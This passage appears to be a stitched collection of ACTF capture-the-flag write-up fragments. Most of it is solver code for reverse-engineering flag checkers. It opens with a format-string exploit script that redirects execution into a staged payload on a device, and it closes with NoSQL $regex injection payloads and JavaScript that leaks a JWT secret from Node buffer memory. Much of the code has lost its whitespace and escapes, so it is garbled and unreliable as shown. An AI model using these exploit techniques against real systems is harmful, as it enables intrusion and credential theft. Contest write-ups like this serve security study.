def wait_prompt(io, name, need=None): buf = b"" end = time.time() + 40 whiletime.time() < end: part = io.recvuntil(b"< ", timeout=max(0.5, end - time.time())) ifnot part: break buf += part ifneed is None or needinbuf: returnbuf raise RuntimeError(f"timeout waiting {name}: {buf[-80:]!r}")def main(): assert len(STAGE1) < 123 and b"n"notinSTAGE1 io = connect_shell() time.sleep(0.2) io.clean(timeout=0.2) # printf(buf) 格式串：第 7 个参数在精确 63 字节输入时可控为 0x20000000； # 写 0xa0a5，即 c.j 0x20000068，让 exit 路径跳到 UART DMA ring 中的 stage1。 patch = b"%41120c"+ b"%c"* 5 + b"%hn" patch += b"A"* (62 - len(patch)) + b" " io.send(patch) wait_prompt(io,"patch", b"AAAAAAAAAAAAAAAA") # 对齐 128 字节 DMA ring，使后续 stage1 落在 0x20000068。 io.send(b"x00"* 63) wait_prompt(io,"filler", b"> < ") # stage1 复制内嵌 loader 到安全 RAM；loader 打印 R 后读取原始 stage2。 io.send(b"x00x00"+ STAGE1 + b"n") wait_prompt(io,"stage1 head", b"> < ") iflen(STAGE1) + 2 > 63: wait_prompt(io,"stage1 tail", b"> ") io.send(b"exitn") io.recvuntil(b"see yan", timeout=10) io.recvuntil(b"R", timeout=10) foriinrange(0, len(STAGE2), 16): io.send(STAGE2[i : i + 16]) time.sleep(0.02) io.recvuntil(b"L", timeout=10) io.recvuntil(b"S", timeout=10) io.recvuntil(b"T", timeout=10) data = io.recvn(DUMP_LEN, timeout=90) m = re.search(rb"ACTF{[^}]+}", data) ifnot m: print(data) raise SystemExit("flag not found") print(m.group(0).decode())if__name__ =="__main__": main()
<calcPr calcId="191029"iterate="1"iterateCount="1"/>
HEX2DEC(INDEX(I:I, C5)) - 11462713 * C4/4 - 918823512
ins = (int(I[row], 16) - 11462713 * (pc // 4) - 918823512) & 0xffffffff
Hibegin initChecking flagI hate General Physics, but sys make me fun. Anyway, you got a WRONG flag.
x = ((flag[i] ^ 0x37) + 0x2f) & 0xff;
flag[i] = ((target[i] - 0x2f) & 0xff) ^ 0x37
ACTF{do-u-love-General-Physics-(H)?
ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+-/=
perm[i] = src_alpha[(37 * i + 47) & 0x3f]第三段：CRC32 + 变种hash的相邻字符约束
JJY+ndsVry-wWNA9MJYcg5Y0WSIwWi8Ir+rOG-==
I-cann0t-love-it-anymore233-
def h77c(buf): h = 0x811c9dc5 forbinbuf: ifb == 0: break h ^= b h = ((h >> 25) + ((h << 7) & 0xffffffff)) & 0xffffffff h = (h + ((h << 13) & 0xffffffff)) & 0xffffffff h = (h ^ (h >> 5)) & 0xffffffff returnh
15c077f9-631f-44d8-b
03 81 f5 43 bc 80 c4 0f 8b 35 d4 37 f1 39 35 96
826-af6c60f15e4f
15c077f9-631f-44d8-b826-af6c60f15e4f
#!/usr/bin/env python3
# -*- coding: utf-8 -*-"""Solver for ACTF ?! sys1-lab7 !?Usage: python3 solve_sys1_lab7.py challenge.zipThe script only uses Python standard library."""import base64import ioimport reimport stringimport sysimport zipfileimport xml.etree.ElementTree as ETNS ="{http://schemas.openxmlformats.org/spreadsheetml/2006/main}"def u32(x: int) -> int: returnx & 0xffffffff
def read_xlsx_from_outer(path: str) -> bytes: with zipfile.ZipFile(path,"r") as zf: names = zf.namelist() xlsx = [nforninnamesifn.lower().endswith(".xlsx")] ifnot xlsx: raise RuntimeError("no xlsx found in outer zip") returnzf.read(xlsx[0])def load_cells(xlsx_bytes: bytes) -> dict[str, str]: with zipfile.ZipFile(io.BytesIO(xlsx_bytes),"r") as zf: # shared strings sst_root = ET.fromstring(zf.read("xl/sharedStrings.xml")) shared = [] forsiinsst_root.findall(NS +"si"): shared.append("".join(t.text or""fortinsi.iter(NS +"t"))) sheet_root = ET.fromstring(zf.read("xl/worksheets/sheet1.xml")) cells = {} forcinsheet_root.iter(NS +"c"): ref = c.attrib.get("r") ifnot ref: continue v = c.find(NS +"v") val = v.textifv is not None and v.text is not Noneelse"" typ = c.attrib.get("t","") iftyp =="s"and val !="": val = shared[int(val)] eliftyp =="inlineStr": val ="".join(t.text or""fortinc.iter(NS +"t")) cells[ref] = val returncells
def build_memory(cells: dict[str, str]) -> dict[int, int]: mem = {} forref, valincells.items(): m = re.fullmatch(r"K(d+)", ref) ifnot m: continue ifnot re.fullmatch(r"[0-9a-fA-F]+", val or""): continue row = int(m.group(1)) mem[(row - 2) * 4] = int(val, 16) & 0xffffffff returnmem
def mem_bytes(mem: dict[int, int], addr: int, size: int) -> bytes: out = bytearray() forainrange(addr, addr + size): w = mem.get((a // 4) * 4, 0) out.append((w >> ((a & 3) * 8)) & 0xff) returnbytes(out)def recover_part0(mem: dict[int, int]) -> bytes: # target table at 0x454c. 0..0x1e bytes are checked as ((flag[i] ^ 0x37) + 0x2f) & 0xff target = mem_bytes(mem, 0x454c, 35) out = [] fori, binenumerate(target): ifi <= 0x1e: out.append(((b - 0x2f) & 0xff) ^ 0x37) else: out.append(b) returnbytes(out)def recover_part1(mem: dict[int, int]) -> bytes: src_alpha = mem_bytes(mem, 0x4114, 0x43).split(b" ")[0] perm = bytes(src_alpha[((37 * i + 47) & 0x3f)]foriinrange(64)) target = mem_bytes(mem, 0x4044, 40).split(b" ")[0] std = b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" trans = bytes.maketrans(perm, std) returnbase64.b64decode(target.translate(trans))def h77c(buf: bytes) -> int: h = 0x811c9dc5 forbinbuf: ifb == 0: break h = u32(h ^ b) h = u32((h >> 25) + ((h << 7) & 0xffffffff)) h = u32(h + ((h << 13) & 0xffffffff)) h = u32(h ^ (h >> 5)) returnh
def recover_part2(mem: dict[int, int], known_prefix: bytes) -> bytes: state = bytearray(mem_bytes(mem, 0x4158, 17)) # "expand 32-byte k " targets = [int.from_bytes(mem_bytes(mem, 0x416c + 4 * i, 4),"little")foriinrange(19)] alphabet = (string.ascii_letters + string.digits + string.punctuation +" ").encode() constraints = [] forn, posinenumerate(range(0x3f, 0x52)): state[pos % 6] = pos & 0xff pairs = [] forainalphabet: forbinalphabet: tmp = bytearray(state) tmp[12] = a tmp[13] = b ifh77c(bytes(tmp)) == targets[n]: pairs.append(bytes([a, b])) ifnot pairs: raise RuntimeError(f"no pair found at position {pos}") constraints.append(pairs) seqs = constraints[0] forpairsinconstraints[1:]: seqs = [s + p[1:]forsinseqsforpinpairsifs[-1:] == p[:1]] ifnot seqs: raise RuntimeError("adjacent-pair chain broken") iflen(seqs) != 1: raise RuntimeError(f"ambiguous part2: {seqs!r}") returnseqs[0]def xtime(x: int) -> int: x &= 0xff return((x << 1) & 0xff) ^ (0x1difx & 0x80else0)def gf_mul(a: int, b: int) -> int: a &= 0xff b &= 0xff res = 0 whileb: ifb & 1: res ^= a b >>= 1 a = xtime(a) returnres & 0xff
def gf_pow(a: int, n: int) -> int: r = 1 whilen: ifn & 1: r = gf_mul(r, a) a = gf_mul(a, a) n >>= 1 returnr
def invert_mix_matrix() -> list[list[int]]: mat = [[2, 3, 1, 1], [1, 2, 3, 1], [1, 1, 2, 3], [3, 1, 1, 2]] a = [row[:] + [1ifi == jelse0forjinrange(4)]fori, rowinenumerate(mat)] forcolinrange(4): piv = next(rforrinrange(col, 4)ifa[r][col]) a[col], a[piv] = a[piv], a[col] inv_p = gf_pow(a[col][col], 254) a[col] = [gf_mul(x, inv_p)forxina[col]] forrinrange(4): ifr == col: continue factor = a[r][col] iffactor: a[r] = [a[r][c] ^ gf_mul(factor, a[col][c])forcinrange(8)] return[row[4:]forrowina]INV_MIX = invert_mix_matrix()def inv_mix_col(col: list[int]) -> list[int]: return[ gf_mul(INV_MIX[i][0], col[0]) ^ gf_mul(INV_MIX[i][1], col[1]) ^ gf_mul(INV_MIX[i][2], col[2]) ^ gf_mul(INV_MIX[i][3], col[3]) foriinrange(4) ]def recover_part3(mem: dict[int, int], known: bytes) -> bytes: key1 = bytearray(mem_bytes(mem, 0x4158, 17)) forposinrange(0x3f, 0x52): key1[pos % 6] = pos & 0xff key1[12] = known[pos] key1[13] = known[pos + 1] key1 = bytes(key1[:16]) key2 = known[:16] ct = mem_bytes(mem, 0x41b8, 16) sbox = mem_bytes(mem, 0x4570, 256) inv_sbox = [0] * 256 fori, binenumerate(sbox): inv_sbox[b] = i def round_key(r: int) -> bytes: sh = (r & 3) + 3 c = (1 << (r % 10)) & 0xff ifr > 7: c ^= 0x1b returnbytes((((b << sh) & 0xff) ^ c)forbinkey1) st = list(ct) forrinrange(6, -1, -1): rk = round_key(r) st = [x ^ rk[i]fori, xinenumerate(st)] ifr <= 5: forbaseinrange(0, 16, 4): st[base:
base + 4] = inv_mix_col(st[base:
base + 4]) old = st[:] # inverse ShiftRows st[1], st[5], st[9], st[13] = old[13], old[1], old[5], old[9] st[2], st[6], st[10], st[14] = old[10], old[14], old[2], old[6] st[3], st[7], st[11], st[15] = old[7], old[11], old[15], old[3] st = [inv_sbox[x]forxinst] returnbytes(st[i] ^ key1[i] ^ key2[i]foriinrange(16))def solve(path: str) -> str: xlsx = read_xlsx_from_outer(path) cells = load_cells(xlsx) mem = build_memory(cells) part0 = recover_part0(mem) part1 = recover_part1(mem) part2 = recover_part2(mem, part0 + part1) part3 = recover_part3(mem, part0 + part1 + part2) # The checker consumes the first 99 bytes. The conventional ACTF wrapper needs the trailing brace. return(part0 + part1 + part2 + part3 + b"}").decode()if__name__ =="__main__": iflen(sys.argv) != 2: print(f"usage: {sys.argv[0]} <challenge.zip>", file=sys.stderr) sys.exit(1) print(solve(sys.argv[1]))
$ file virtualnpu.exevirtualnpu.exe: PE32+ executableforMS Windows 6.00 (console), x86-64, 8 sections$ strings -a virtualnpu.exe | grep -E"VirtualNPU|SALT|Correct|Wrong|npu|AES"VirtualNPU Flag VerifierEnter the flag:
VirtualNPU_2026_SALTCorrect!Wrong!_Z16npu_cycle_kernelPhPjjPyS0_AES_SBOXnvcuda.dllnvcudart_hybrid64.dll
Idx Name Size VMA File off0 .text 00019670 0000000140001000 000004001 .rdata 0001009e 000000014001b000 00019c004 .nv_fatb 000641b8 0000000140039000 0002c200
1400015d3 mov ecx, 3000h140001608 call malloc_like140001613 mov r8d, 3000h140001618 lea rdx, [rip+19EA1h] ; 14001B4C014000161f mov rcx, rax140001622 call memcpy_like
0x19c00 + (0x14001b4c0 - 0x14001b000) = 0x1a0c0
offset = 0x1a0c0size = 0x3000
0001d0c0 VirtualNPU Flag Verifier0001d0e0 Enter the flag:
0001d128 VirtualNPU_2026_SALT0001d150 Correct!0001d160 Wrong!
salt = b"VirtualNPU_2026_SALT"mask1 = [ 0x00, 0x37, 0x6e, 0xa5, 0xdc, 0x13, 0x4a, 0x81, 0xb8, 0xef, 0x26, 0x5d, 0x94, 0xcb, 0x02, 0x39, 0x70, 0xa7, 0xde, 0x15,]mask2 = [ 0x4c, 0x83, 0xba, 0xf1, 0x28, 0x5f, 0x96, 0xcd, 0x04, 0x3b, 0x72, 0xa9,]key = bytes([salt[i] ^ mask1[i]foriinrange(20)] + [salt[i] ^ mask2[i]foriinrange(12)])
565e1cd1a97226cfe8ba796fa4f9346623e692411aeac8855d3efa83546e2d9b
def rc4(data: bytes, key: bytes, drop: int = 0x200) -> bytes: s = list(range(256)) j = 0 foriinrange(256): j = (j + s[i] + key[i & 31]) & 0xff s[i], s[j] = s[j], s[i] i = j = 0 for_inrange(drop): i = (i + 1) & 0xff j = (j + s[i]) & 0xff s[i], s[j] = s[j], s[i] _ = s[(s[i] + s[j]) & 0xff] out = bytearray() forcindata: i = (i + 1) & 0xff j = (j + s[i]) & 0xff s[i], s[j] = s[j], s[i] out.append(c ^ s[(s[i] + s[j]) & 0xff]) returnbytes(out)
000: 0d 00 c0 05 00 00 00 00 00 00 00 00 00 00 00 00001: ff 00 c0 06 00 00 00 00 00 00 00 00 00 00 00 00002: 41 31 40 0c 00 00 00 00 00 00 00 00 00 00 00 00003: 26 59 60 04 00 00 00 00 00 00 00 00 00 00 00 00004: 00 18 42 30 00 00 00 00 00 00 00 00 00 00 00 00005: 00 00 62 ec 00 00 00 00 00 00 00 00 00 00 00 00
b0: imm / index / low operandb1: src / modifierb2: dst / address classb3: opcode
0x05: mov imm8, dst0x06: mov imm8, dst，常用于初始化 mask0x9d: store / load 索引类操作0xec: 读输入字符0x44: xor / add 混合0x34: 查表准备0x91: 下标相关操作0x2d: 从 AES_SBOX 取值0x35: 写回变换结果0xc5: 比较变换结果和目标常量0xfc: 设置最终返回状态
349: 63 00 20 05350: 7c 00 40 05353: 77 00 20 05354: 7b 00 40 05357: f2 00 20 05358: 6b 00 40 05361: 6f 00 20 05362: c5 00 40 05365: 30 00 20 05366: 01 00 40 05
63 7c 77 7b f2 6b 6f c5 30 01 ...
ACTF{[0-9a-f]{32}}
AES_SBOX[input[i] ^ k[i]] == target[i]
target = [ 0x2a, 0xb9, 0x81, 0x8a, 0xf1, 0xf4, 0xee, 0x89, 0xd0, 0xa2, 0x0d, 0x71, 0x76, 0xac, 0xf9, 0x4f, 0x20, 0x31, 0x1b, 0x70, 0xc7, 0x7e, 0x50, 0x35, 0x80, 0x54, 0xe6, 0x2f, 0xe9, 0xc8, 0x93, 0x1f, 0x84, 0x85, 0xcc, 0x7a, 0xdb, 0xd5,]
k = [ 0xd4, 0x98, 0xc5, 0x89, 0x50, 0x8e, 0xae, 0xc2, 0x01, 0x2e, 0xc0, 0x1c, 0x36, 0x98, 0x58, 0xa7, 0x62, 0x4c, 0x25, 0xb2, 0x55, 0xbd, 0x58, 0xed, 0x0a, 0xc5, 0xc2, 0x7e, 0xd9, 0x88, 0x47, 0xff, 0x29, 0x5e, 0x15, 0x84, 0xa8, 0xc8,]
input[i] = AES_INV[target[i]] ^ k[i]
#!/usr/bin/env python3
from pathlib import PathEXE ="virtualnpu.exe"BYTECODE_OFF = 0x1A0C0BYTECODE_SIZE = 0x3000AES_SBOX = [ 0x63, 0x7c, 0x77, 0x7b, 0xf2, 0x6b, 0x6f, 0xc5, 0x30, 0x01, 0x67, 0x2b, 0xfe, 0xd7, 0xab, 0x76, 0xca, 0x82, 0xc9, 0x7d, 0xfa, 0x59, 0x47, 0xf0, 0xad, 0xd4, 0xa2, 0xaf, 0x9c, 0xa4, 0x72, 0xc0, 0xb7, 0xfd, 0x93, 0x26, 0x36, 0x3f, 0xf7, 0xcc, 0x34, 0xa5, 0xe5, 0xf1, 0x71, 0xd8, 0x31, 0x15, 0x04, 0xc7, 0x23, 0xc3, 0x18, 0x96, 0x05, 0x9a, 0x07, 0x12, 0x80, 0xe2, 0xeb, 0x27, 0xb2, 0x75, 0x09, 0x83, 0x2c, 0x1a, 0x1b, 0x6e, 0x5a, 0xa0, 0x52, 0x3b, 0xd6, 0xb3, 0x29, 0xe3, 0x2f, 0x84, 0x53, 0xd1, 0x00, 0xed, 0x20, 0xfc, 0xb1, 0x5b, 0x6a, 0xcb, 0xbe, 0x39, 0x4a, 0x4c, 0x58, 0xcf, 0xd0, 0xef, 0xaa, 0xfb, 0x43, 0x4d, 0x33, 0x85, 0x45, 0xf9, 0x02, 0x7f, 0x50, 0x3c, 0x9f, 0xa8, 0x51, 0xa3, 0x40, 0x8f, 0x92, 0x9d, 0x38, 0xf5, 0xbc, 0xb6, 0xda, 0x21, 0x10, 0xff, 0xf3, 0xd2, 0xcd, 0x0c, 0x13, 0xec, 0x5f, 0x97, 0x44, 0x17, 0xc4, 0xa7, 0x7e, 0x3d, 0x64, 0x5d, 0x19, 0x73, 0x60, 0x81, 0x4f, 0xdc, 0x22, 0x2a, 0x90, 0x88, 0x46, 0xee, 0xb8, 0x14, 0xde, 0x5e, 0x0b, 0xdb, 0xe0, 0x32, 0x3a, 0x0a, 0x49, 0x06, 0x24, 0x5c, 0xc2, 0xd3, 0xac, 0x62, 0x91, 0x95, 0xe4, 0x79, 0xe7, 0xc8, 0x37, 0x6d, 0x8d, 0xd5, 0x4e, 0xa9, 0x6c, 0x56, 0xf4, 0xea, 0x65, 0x7a, 0xae, 0x08, 0xba, 0x78, 0x25, 0x2e, 0x1c, 0xa6, 0xb4, 0xc6, 0xe8, 0xdd, 0x74, 0x1f, 0x4b, 0xbd, 0x8b, 0x8a, 0x70, 0x3e, 0xb5, 0x66, 0x48, 0x03, 0xf6, 0x0e, 0x61, 0x35, 0x57, 0xb9, 0x86, 0xc1, 0x1d, 0x9e, 0xe1, 0xf8, 0x98, 0x11, 0x69, 0xd9, 0x8e, 0x94, 0x9b, 0x1e, 0x87, 0xe9, 0xce, 0x55, 0x28, 0xdf, 0x8c, 0xa1, 0x89, 0x0d, 0xbf, 0xe6, 0x42, 0x68, 0x41, 0x99, 0x2d, 0x0f, 0xb0, 0x54, 0xbb, 0x16,]K = [ 0xd4, 0x98, 0xc5, 0x89, 0x50, 0x8e, 0xae, 0xc2, 0x01, 0x2e, 0xc0, 0x1c, 0x36, 0x98, 0x58, 0xa7, 0x62, 0x4c, 0x25, 0xb2, 0x55, 0xbd, 0x58, 0xed, 0x0a, 0xc5, 0xc2, 0x7e, 0xd9, 0x88, 0x47, 0xff, 0x29, 0x5e, 0x15, 0x84, 0xa8, 0xc8,]def build_key() -> bytes: salt = b"VirtualNPU_2026_SALT" mask1 = [ 0x00, 0x37, 0x6e, 0xa5, 0xdc, 0x13, 0x4a, 0x81, 0xb8, 0xef, 0x26, 0x5d, 0x94, 0xcb, 0x02, 0x39, 0x70, 0xa7, 0xde, 0x15, ] mask2 = [ 0x4c, 0x83, 0xba, 0xf1, 0x28, 0x5f, 0x96, 0xcd, 0x04, 0x3b, 0x72, 0xa9, ] returnbytes([salt[i] ^ mask1[i]foriinrange(20)] + [salt[i] ^ mask2[i]foriinrange(12)])def rc4(data: bytes, key: bytes, drop: int = 0x200) -> bytes: s = list(range(256)) j = 0 foriinrange(256): j = (j + s[i] + key[i & 31]) & 0xff s[i], s[j] = s[j], s[i] i = j = 0 for_inrange(drop): i = (i + 1) & 0xff j = (j + s[i]) & 0xff s[i], s[j] = s[j], s[i] _ = s[(s[i] + s[j]) & 0xff] out = bytearray() forcindata: i = (i + 1) & 0xff j = (j + s[i]) & 0xff s[i], s[j] = s[j], s[i] out.append(c ^ s[(s[i] + s[j]) & 0xff]) returnbytes(out)def extract_targets(bytecode: bytes) -> list[int]: # 比较区的结构为： # xx 04 60 91 ; 选择第 xx 位 # tt 00 80 05 ; 写入 target 常量 tt # aa 00 6c c5 ; cmp # 每 4 条指令一组，目标常量在第 611、615、619... 条。 targets = [] forinsn_idxinrange(611, 760, 4): ins = bytecode[insn_idx * 16: insn_idx * 16 + 4] iflen(ins) != 4 or ins[3] != 0x05 or ins[2] != 0x80: raise RuntimeError(f"bad target insn at {insn_idx}: {ins.hex()}") targets.append(ins[0]) returntargets
def main() -> None: data = Path(EXE).read_bytes() enc = data[BYTECODE_OFF:
BYTECODE_OFF + BYTECODE_SIZE] bytecode = rc4(enc, build_key()) targets = extract_targets(bytecode) assert len(targets) == 38 aes_inv = [0] * 256 fori, vinenumerate(AES_SBOX): aes_inv[v] = i flag = bytes(aes_inv[t] ^ kfort, kinzip(targets, K)) assert flag.startswith(b"ACTF{") and flag.endswith(b"}") assert len(flag) == 38 print(flag.decode())if__name__ =="__main__": main()
$ unzip flagchecker.zip$ file flagcheckerflagchecker: ELF 64-bit LSB executable, LoongArch, version 1 (SYSV), statically linked, stripped
$ strings -a flagchecker | grep -E'ACTF|Wrong|Verifier|CT77|JGqVVFpm|SHA|AES|flag'flagCT77IKGJ*main.JGqVVFpmWrong!AES-CBCJGqVVFpmVerifierSHA2-256main.(*JGqVVFpm).E3XDFQIVmain.(*JGqVVFpm).NAT7NCZZmain.(*JGqVVFpm).ELK4X6I7...
funcmain() { var flag string fmt.Scan(&flag) checker := &Wj6J299f{} ifchecker.Verifier(flag) { fmt.Println("Correct!") }else{ fmt.Println("Wrong!") }}
func (v *Wj6J299f) Verifier(s string) bool { iflen(s) != 38 { returnfalse } ifs[0:5] !="ACTF{"{ returnfalse } ifs[37] !='}'{ returnfalse } body := []byte(s[5:37]) // 这里不是直接调用固定函数，而是通过反射找方法。 // 反射出来的方法名最终是 CT77IKGJ。 name :="CT77IKGJ" method := reflect.ValueOf(v).MethodByName(name) ret := method.Call([]reflect.Value{reflect.ValueOf(body)}) returnret[0].Bool()}
整理后的结构类似这样：func (v *Wj6J299f) CT77IKGJ(buf []byte) bool { iflen(buf) != 32 { returnfalse } c := &JGqVVFpm{} if!c.E3XDFQIV(buf[0]) {returnfalse} if!c.NAT7NCZZ(buf[1]) {returnfalse} if!c.ELK4X6I7(buf[2]) {returnfalse} if!c.V427DDEC(buf[3]) {returnfalse} // ...中间省略，都是同一种模式 if!c.PNSPHOC5(buf[30]) {returnfalse} if!c.I5Y6HCJI(buf[31]) {returnfalse} returntrue}
func (c *JGqVVFpm) E3XDFQIV(x byte) bool { t := x t ^= 0x13 t += 0x2a t ^= 0x59 returnt == 0x0a}
def E3XDFQIV(x): t = x t = (t ^ 0x13) & 0xff t = (t + 0x2a) & 0xff t = (t ^ 0x59) & 0xff returnt == 0x0aforxinrange(256): ifE3XDFQIV(x): print(hex(x), chr(x))
def solve_one(predicate): ans = [] forxinrange(256): ifpredicate(x): ans.append(x) returnans
ACTF{fce553ec44532f11ff209e1213c92acd}
abyssgate 用户态入口程序abyss.ko 内核 misc 设备模块，设备名 /dev/abyss
abyssgate 第一阶段 -> 解密第二阶段 ELF -> 第二阶段读取 flag -> 加载 sys_enter_ioctl/sys_exit_ioctl eBPF -> ioctl /dev/abyss -> abyss.ko 内部状态最终与固定 32 字节比较
ELF base: 0x400000key VA: 0x5a82d0blob VA: 0x479190len: 0x12f108drop: 0x200
4d2921a9568799e6e1fad98fb88c716eac8fd89588dde6f09421f3515ec3fd8d
Enter the flag:
ACTF{/dev/abysssyscalls/sys_enter_ioctlsyscalls/sys_exit_ioctl
ioctl(fd, 0xab00) // resetforroundin0..3: ioctl(fd, 0xc018ab04) // negotiate, size 0x18,in/out ioctl(fd, 0x4018ab05) // commit, size 0x18,inioctl(fd, 0xab02) // final transformioctl(fd, 0x4024ab03) // check, size 0x24
a58353a9c2c24b5f7eb82b77e35c9f4de38da70dce9596137f480a81f9968718
tracepoint/syscalls/sys_enter_ioctltracepoint/syscalls/sys_exit_ioctl
用户态原始 buffer -> sys_enter_ioctl eBPF 改写 -> abyss.ko ioctl handler copy_from_user -> handler 修改状态 / copy_to_user -> sys_exit_ioctl eBPF 再改写用户态 buffer
0x010 起：256 字节 S-box0x110 起：256 字节逆/替代表0x210 起：32 字节轮常量
block = arg[4:12] xor arg[16:24]
0x2e70 reset/init0x3400 cmd2 final transform0x3750 cmd3 check0x3930 cmd4 negotiate0x3a60 cmd5 commit
_copy_from_user -> memcpy_copy_to_user -> memcpyktime_get -> controlled counter__get_task_comm ->"sudo"
iftiming/ftrace check failed: round_keys ^= 0xdeaddeadifround > 0: round_key = lai_massey_apply_feedback(round_key, previous_ciphertext)plain = arg[4:12] xor arg[16:24]cipher = lai_massey_encrypt_block(round_key, plain)session.blocks[round] = cipherround++
a58353a9c2c24b5f7eb82b77e35c9f4de38da70dce9596137f480a81f9968718
2cc41a6d2a7153624f78eb7eeb42bb6171df0badae7fb0b2bfec2e658844867b
2cc41a6d2a7153624f78eb7eeb42bb6171df0badae7fb0b2bfec2e658844867b
key0 = 13f75f93334843b61892b98230e9061234b43e27c99c143ed50b115c2754b3d9key1 = 7c3a2592c39eefa119fd74f82719d0be4eb551ea658be4e818711033f1f8a429key2 = b769eac276a21aad493627372bacec4b81e59ab9908751d44bbe40f8cd0da89ckey3 = cda2ca49de15161fc24cec1799045b47a16ee0729c35f963809ecb827a011a34
round0 plain = f1bd4cca8f184f99round1 plain = e2eadf5d81049b3dround2 plain = 79ed8174a816f384round3 plain = 0ff798f8c6a5dfcd
arg[4:12] xor arg[16:24]
flag[0..7] 影响 round0，并继续影响后续 roundflag[8..15] 从 round1 开始影响flag[16..23] 从 round2 开始影响flag[24..31] 只影响 round3
prefix =""forposinrange(32): round_id = pos // 8 byte_prefix_len = pos % 8 + 1 forcin"0123456789abcdef": test= prefix + c +"0"* (31 - pos) run second-stage generation + eBPF-enter simulation plain = arg[4:12] ^ arg[16:24] ifplain[round_id][:
byte_prefix_len] == target_plain[round_id][:
byte_prefix_len]: prefix += c break
b02f97ee296b1218c4b771e3cbc21120
36a70: movzx edx,BYTE PTR [rsi+rcx*1]36a74: add edx,0xffffffd0 ; 字符减'0'36a77: cmp edx,0x936a7a: ja 37571 ; 不是数字则报错36a80: lea eax,[rax+rax*4]36a83: lea eax,[rdx+rax*2] ; eax = eax * 10 + digit...36a9a: cmp eax,0x29b9270136a9f: jb 36b1a ; x < 0x29b92701 才继续
0x29b92701 = 700000001
x < 700000001
fnmain() { print!("Please Input your school id: "); letmut input = String::
new(); std::io::
stdin().read_line(&mut input).unwrap(); lets = input.trim(); letx: u32 = s.parse().unwrap(); ifx >= 700000001 { println!("wrong"); return; } // 后面进入高精度数学表达式计算 // check(x)}
$ objdump -R calc_my_point | grep -E'ece0|ecdf|ece1|ece2|ece3|ece4|ece5|ece6'00000000000ecdf8 R_X86_64_RELATIVE *ABS*+0x0000000000037ff000000000000ece00 R_X86_64_RELATIVE *ABS*+0x000000000004819000000000000ece08 R_X86_64_RELATIVE *ABS*+0x000000000003799000000000000ece10 R_X86_64_RELATIVE *ABS*+0x00000000000473a000000000000ece18 R_X86_64_RELATIVE *ABS*+0x00000000000379b000000000000ece20 R_X86_64_RELATIVE *ABS*+0x000000000003802000000000000ece28 R_X86_64_RELATIVE *ABS*+0x000000000003a10000000000000ece30 R_X86_64_RELATIVE *ABS*+0x00000000000593c000000000000ece40 R_X86_64_RELATIVE *ABS*+0x000000000005148000000000000ece48 R_X86_64_RELATIVE *ABS*+0x000000000003c4e000000000000ece50 R_X86_64_RELATIVE *ABS*+0x000000000004968000000000000ece58 R_X86_64_RELATIVE *ABS*+0x000000000003bcd000000000000ece60 R_X86_64_RELATIVE *ABS*+0x000000000003c200
$ nm -C calc_my_point | grep -E'0000000000037ff0|00000000000379b0|0000000000038020|000000000003a100|0000000000048190|00000000000473a0|00000000000593c0|0000000000051480|000000000003c4e0|0000000000049680|000000000003c200|0000000000037990'0000000000037ff0 T mpc_init30000000000037990 T mpc_clear00000000000379b0 T mpc_exp0000000000038020 T mpc_log000000000003a100 T mpc_sub0000000000048190 T mpfr_set_ui00000000000473a0 T mpfr_set400000000000593c0 T __gmpfr_set_sj0000000000051480 T mpfr_init2000000000003c4e0 T mpfr_div_2ui0000000000049680 T mpfr_sub000000000003c200 T mpfr_less_p
36d09: lea rax,[rip+0xfffffffffffd34f0] ; 表地址约为 0xa20036d10: mov r13,QWORD PTR [r15+rax*1]36d14: cmp r13,0xffffffffffffffff36d18: je 36e00 ; -1 作为一个分隔/运算标记36d1e: test r13,r1336d21: jne 37000 ; 非 0 常量入栈
50 * (cos(pi * x / 33033) + sin(pi * x / 32768))+ exp(-x) * tanh(x / 20 + 3)
37141: mov esi,0x137146: mov rdi,r1437149: xor edx,edx3714b: call mpfr_set_ui...37170: mov edx,0x9037175: mov rsi,rdi37178: xor ecx,ecx3717a: call mpfr_div_2ui ; 1 / 2^0x90 = 2^-144...371b0: mov esi,0x64371b5: mov rdi,r14371b8: xor edx,edx371ba: call mpfr_set_ui ; 100
37357: lea rsi,[rsp+0x1c0]37367: call mpfr_less_p3736d: test eax,eax3736f: je 373a837371: lea rdi,[rsp+0x50]37376: lea rsi,[rsp+0x1c0]3737e: call mpfr_less_p37384: test eax,eax
from mpmath import mpmp.dps = 200
def f(x): x = mp.mpf(x) return50 * (mp.cos(mp.pi * x / 33033) + mp.sin(mp.pi * x / 32768)) + mp.e ** (-x) * mp.tanh(x / 20 + 3)
# 程序等价于判断 f(x) 是否非常接近 100
# 误差量级为 2^-144
50 * (cos(pi * x / 33033) + sin(pi * x / 32768))
cos(t) <= 1sin(t) <= 1
cos(pi * x / 33033) + sin(pi * x / 32768) <= 2
cos(pi * x / 33033) = 1sin(pi * x / 32768) = 1
# solve.py
from math import gcdLIMIT = 700000001m1, r1 = 66066, 0m2, r2 = 65536, 16384
# 简单暴力枚举第一个同余，规模很小ans = []forxinrange(r1, LIMIT, m1): ifx % m2 == r2: ans.append(x)print(ans)forxinans: print(f"ACTF{{{x}}}")
# 顺便输出一些信息，确认解的唯一性print("count =", len(ans))print("gcd =", gcd(m1, m2))
paper-submission-system/lib/profileImport.jsreturn{ used:
false, track: submitted.track, kind: packet.queue, rubricId: rubric.rubricId, [packet.slotField]: packet.slotValue};
{"source":"External service record","label":"Committee shadow slot","committee": { "registration": { "reference": { "$regex":"^prefix" }, "season":"AAA26" }, "desk":"overflow" }}
{ used:
false, track:"systems", kind:"...", rubricId:"...", code: {"$regex":"^prefix"}}
Committee service desk has an available assignment slot.Committee service desk has not found an assignment slot yet.
POST /reviewer/claimemail=committee-shadow@aaa26.big1code=f037f8c7e71a2a5627a7b86682630fd0c52b
paper-submission-system/lib/filters.jspaper-submission-system/routes/reviewer.js
{"expression":"..."}
(() => {letx = Buffer.from('X');lets = Buffer.from(x.buffer).toString('latin1');return/aaa26_[0-9a-f]{48}/.test(s);})()
jwtSecret: process.env.JWT_SECRET || `aaa26_${randomBytes(24).toString("hex")}`
(() => {letp ="aaa26_5d3d";for(leti = 0; i < 2; i++) { letx = Buffer.from('X'); lets = Buffer.from(x.buffer).toString('latin1'); letm = s.match(/aaa26_[0-9a-f]{48}/g) || []; for(letj = 0; j < m.length; j++) { if(m[j].startsWith(p))returntrue; } }returnfalse;})()
